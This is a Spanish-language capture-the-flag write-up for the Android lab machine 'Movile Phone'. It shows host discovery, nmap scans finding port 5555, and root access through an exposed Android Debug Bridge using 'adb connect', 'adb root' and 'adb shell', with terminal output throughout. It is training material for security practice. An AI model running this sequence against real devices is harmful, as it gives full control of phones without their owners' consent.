---
title: Movile Phone
description: ¡Explora el emocionante mundo del hacking en Android en nuestra plataforma de CTFs y retos! Desafía las vulnerabilidades en el sistema operativo móvil más utilizado, utiliza herramientas especializadas y aplica técnicas avanzadas para comprometer y manipular dispositivos Android. Cada reto te permitirá mejorar tus habilidades en explotación de aplicaciones móviles y control de sistemas Android. ¡Acepta el desafío, demuestra tu destreza y domina el arte de la seguridad en Android!
date: 2025-03-06
toc: true
pin: false
image:
 path: /assets/img/thl-writeup-movilephone/movilephone_logo.png
categories:
  - The Hackers Labs
tags:
  - android
  - the hackers labs
  - adb
  - tcp
  - privilege escalation

---
## Information Gathering

![](assets/img/thl-writeup-movilephone/movilephone1_1.png)

```terminal
/home/kali/Documents/thehackerslabs/movilephone:-# arp-scan -l | grep 08:00
192.168.0.60	08:00:27:10:3f:9a	PCS Systemtechnik GmbH
```

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/thehackerslabs/movilephone:-# ping -c 1 192.168.0.60
PING 192.168.0.60 (192.168.0.60) 56(84) bytes of data.
64 bytes from 192.168.0.60: icmp_seq=1 ttl=64 time=0.257 ms

--- 192.168.0.60 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.257/0.257/0.257/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/thehackerslabs/movilephone:-# nmap -p- --open -sS --min-rate 5000 -vvv -Pn 192.168.0.60 -oG nmap1
Status: Up
Ports: 5555/open/tcp//freeciv///	Ignored State: closed (65534)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/thehackerslabs/movilephone:-# nmap -sCV -p5555 -vvv 192.168.0.60 -oN nmap2
PORT     STATE SERVICE  REASON         VERSION
5555/tcp open  freeciv? syn-ack ttl 64
MAC Address: 08:00:27:10:3F:9A (Oracle VirtualBox virtual NIC)
```

---
## Privilege Escalation

Se establece una conexión con el dispositivo a través de Android Debug Bridge utilizando el puerto 5555.

```terminal
/home/kali/Documents/thehackerslabs/movilephone:-# adb connect 192.168.0.60:5555
connected to 192.168.0.60:5555
```

Una vez conectado, intento elevar privilegios con adb root, lo que reinicia el daemon de ADB con privilegios de superusuario

```terminal
/home/kali/Documents/thehackerslabs/movilephone:-# adb root
restarting adbd as root
```

A continuación, abro una shell interactiva en el dispositivo. Y verifico que el acceso se ha obtenido correctamente.

```terminal
/home/kali/Documents/thehackerslabs/movilephone:-# adb shell

root@x86_64:/ # id
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats)
```

Para localizar la flag de root, utilizó find para buscar el archivo root.txt en el sistema.

```terminal
root@x86_64:/ # find / -name 'root.txt' 2>/dev/null
/data/root/root.txt

root@x86_64:/ # cat data/root/root.txt
```